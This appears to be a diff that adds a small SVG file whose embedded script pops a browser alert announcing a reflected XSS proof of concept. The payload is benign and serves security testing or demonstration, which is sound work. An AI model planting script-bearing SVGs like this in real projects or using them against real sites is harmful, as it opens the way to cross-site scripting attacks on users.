@@ -1,0 +1,5 @@
+<svg>
+  <script>
+    alert("Step right up to experience a Reflective XSS Proof of Concept (POC) in the magnificent tent of XSS wonders!");
+  </script>
+</svg>
